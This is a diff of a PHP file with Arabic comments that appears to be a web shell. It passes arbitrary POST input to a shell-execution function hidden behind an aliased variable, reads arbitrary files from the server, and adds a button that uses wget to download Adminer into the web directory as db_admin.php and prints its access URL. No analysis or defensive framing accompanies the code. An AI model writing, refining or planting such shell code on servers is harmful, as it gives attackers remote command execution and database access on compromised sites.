@@ -61,28 +61,28 @@ $imgPreview = '';
 // --- [ منطق العمليات ] ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // تنفيذ الأوامر
+// 1. تنفيذ الأوامر اليدوية من مربع النص
     if (!empty($_POST['cmd_input'])) {
         $viewResult = $sx($_POST['cmd_input'] . " 2>&1");
     }
-    
-    // عرض محتوى الملفات (نصوص)
+
+    // 2. معالجة زر جلب أداة DB Admin
+    if (isset($_POST['get_db_admin'])) {
+        // الأمر يقوم بتحميل الملف من الإنترنت وحفظه مباشرة في المجلد الحالي
+        $cmd = "wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php -O db_admin.php 2>&1";
+        $viewResult = $sx($cmd);
+        
+        if (file_exists('db_admin.php')) {
+            $viewResult .= "\n[+] SUCCESS: Adminer deployed as db_admin.php";
+            $viewResult .= "\n[!] You can now access it via: " . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/db_admin.php";
+        } else {
+            $viewResult .= "\n[-] ERROR: Shell execution failed (check if wget is installed).";
+        }
+    }    // عرض محتوى الملفات (نصوص)
     if (isset($_POST['view_f'])) {
         $f = $currentDirectory . '/' . $_POST['view_f'];
         if (file_exists($f)) $viewResult = $fg($f);
     }
-// التحقق من طلب نشر أداة إدارة قواعد البيانات
-if (isset($_POST['get_db_admin'])) {
-    // استخدام أمر wget عبر الشيل لتحميل الأداة وتسميتها db_admin.php
-    $cmd = "wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php -O db_admin.php 2>&1";
-    $viewResult = $sx($cmd);
-    
-    // التحقق من نجاح العملية
-    if (file_exists('db_admin.php')) {
-        $viewResult .= "\n[+] SUCCESS: Adminer deployed as db_admin.php";
-    } else {
-        $viewResult .= "\n[-] ERROR: Shell execution failed or wget not installed.";
-    }
-}
     // عرض الصور (بتحويلها لـ Base64)
     if (isset($_POST['view_i'])) {
         $imgFile = $currentDirectory . '/' . $_POST['view_i'];
@@ -285,6 +285,7 @@ ob_clean();
 </div>
 </body>
 </html>
+
 
 
 
